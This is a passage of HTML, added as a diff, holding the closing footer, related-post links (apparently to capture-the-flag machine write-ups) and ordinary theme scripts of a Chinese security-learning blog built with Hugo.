+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/20.-cohort/">
+        
+        
+            <div class="article-image">
+                <img src="/p/20.-cohort/assets/image-20261115120600328.38f02db0be810627914dd5f09bcaf8b0_hu13563524453460121695.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 20. Cohort"
+                        
+                        data-hash="md5-OPAtsL6BBieRTdXwm8r4sA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">20. Cohort</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/19.-doubletake/">
+        
+        
+            <div class="article-image">
+                <img src="/p/19.-doubletake/assets/image-20261113211115576.69ccc0ab3b3b5141786756fb894ded08_hu5599740394217170900.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 19. DoubleTake"
+                        
+                        data-hash="md5-aczAqzs7UUF4Z1b7iU3tCA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">19. DoubleTake</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/15.-twomillion/">
+        
+        
+            <div class="article-image">
+                <img src="/p/15.-twomillion/assets/image-20261109110807877.d619cdf339ca6a409d090c0a0a10808d_hu2928835098330789906.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 15. TwoMillion"
+                        
+                        data-hash="md5-1hnN8znKakCdCQwKChCAjQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">15. TwoMillion</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Sp1ke
+    </section>
+    
+    <section class="powerby">
+        
+            记录安全学习 <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+.article-content .highlight-wrap {
+  position: relative;
+  overflow: hidden;
+  border-radius: var(--card-border-radius);
+}
+.article-content .highlight-wrap .highlight {
+  margin:0;
+}
+ 
+.article-content .highlight-wrap.collapse {
+  max-height: 380px;
+}
+ 
+.article-content .highlight-wrap.collapse::after {
+  content: "";
+  position: absolute;
+  left:0;
+  bottom:0;
+  width:100%;
+  height: 80px;
+  background: linear-gradient(transparent, var(--pre-background-color));
+  pointer-events: none;
+}
+ 
+.article-content .code-expand-btn {
+  position:absolute;
+  bottom:8px;
+  right:12px;
+  z-index:2;
+  border: none;
+  padding: 4px 8px;
+  border-radius: 6px;
+  background: var(--card-background);
+  color: var(--text-color);
+  cursor: pointer;
+}
+</style>
+<script>
+document.addEventListener('DOMContentLoaded', ()=>{
+  document.querySelectorAll('.highlight-wrap').forEach(wrap=>{
+    const btn = wrap.querySelector('.code-expand-btn');
+    btn.addEventListener('click', ()=>{
+      wrap.classList.toggle('collapse');
+      btn.innerText = wrap.classList.contains('collapse') ? "▼ 展开" : "▲ 收起";
+    })
+  })
+})
+</script>
+
+    </body>
+</html>
